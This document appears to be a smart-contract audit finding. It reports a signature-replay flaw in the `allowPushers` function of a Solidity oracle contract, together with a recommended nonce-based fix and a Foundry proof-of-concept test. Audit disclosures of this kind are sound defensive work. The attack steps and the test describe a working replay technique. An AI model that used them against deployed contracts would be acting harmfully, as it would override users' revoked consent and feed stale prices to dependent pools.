### Title
`allowPushers` signature replay after `revokePusher` re-establishes delegation without pusher consent — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary
`allowPushers` has no used-signature tracking. A creator can replay a pusher's original EIP-191 consent signature (with a still-valid deadline) after the pusher has called `revokePusher()`, silently re-establishing delegation and redirecting all subsequent pusher writes into the creator's namespace instead of the pusher's own.

### Finding Description
The signature committed to in `allowPushers` is:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
```

The only replay guard is `_ensureDeadline(deadline)` (`block.timestamp <= deadline`). There is no nonce, no per-pusher revocation epoch, and no "consumed signature" bitmap. Once a pusher signs consent with `deadline = T+D`, that signature remains valid for any call to `allowPushers` made before `T+D`, regardless of how many times `revokePusher` has been called in between.

Attack sequence:
1. Pusher signs consent with `deadline = T+1000`.
2. Creator calls `allowPushers(T+1000, [pusher], [sig])` → `namespaceRemapping[pusher] = creator`.
3. Pusher calls `revokePusher()` → `namespaceRemapping[pusher] = address(0)`.
4. Creator calls `allowPushers(T+1000, [pusher], [sig])` again (same signature, deadline still valid) → `namespaceRemapping[pusher] = creator` again.

Step 4 succeeds unconditionally. The pusher's revocation is silently undone.

### Impact Explanation
After step 4, the pusher believes they are pushing into their own namespace (the registrationless default after revocation). Instead, every fallback push still lands in the creator's namespace. The pusher's own namespace feeds remain at price=0 / timestamp=0 — permanently stale. Any pool or price provider reading from the pusher's own namespace feeds receives stale data, which every consumer rejects as an unpushed feed, causing bad-price execution or a non-functional oracle for that pool. The creator gains persistent write authority over their namespace via a pusher who explicitly withdrew consent.

### Likelihood Explanation
The creator holds the original signature off-chain and can replay it at any time before the deadline. No special privilege is required — `allowPushers` is a public function. The pusher has no on-chain mechanism to invalidate the signature short of waiting for the deadline to expire.

### Recommendation
Track consumed signatures with a per-pusher revocation nonce or a `usedSignatures` mapping:

```solidity
mapping(bytes32 => bool) private _usedDelegationSigs;

// inside allowPushers, after signature recovery:
bytes32 sigHash = keccak256(signatures[i]);
require(!_usedDelegationSigs[sigHash], "signature already used");
_usedDelegationSigs[sigHash] = true;
```

Alternatively, maintain a per-pusher `delegationNonce` that is incremented on every `revokePusher` call and include it in the signed message, so any previously issued signature becomes invalid after revocation.

### Proof of Concept
```solidity
// Foundry unit test (add to CompressedOracle.t.sol)
function testRevokeAndReplayAllowPushers() public {
    uint256 deadline = block.timestamp + 1000;
    bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // Step 1: delegate
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // Step 2: pusher revokes
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0));

    // Step 3: creator replays the SAME signature — succeeds, re-establishing delegation
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs); // must revert but does NOT
    assertEq(oracle.namespaceRemapping(pusher), creator, "revocation-finality violated");

    // Step 4: pusher pushes thinking it goes to own namespace — lands in creator's instead
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 raw = _packRaw(900_000, 5, 0);
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(2, 3, raw, tsMs));
    assertTrue(ok);

    // Pusher's own namespace is stale
    assertEq(oracle.getOracleData(oracle.feedIdOf(pusher, 2, 3)).price, 0,
        "pusher own namespace is stale — bad price for any pool reading it");
    // Creator's namespace was updated without pusher's current consent
    assertGt(oracle.getOracleData(oracle.feedIdOf(creator, 2, 3)).price, 0,
        "creator namespace updated after revocation");
}
```
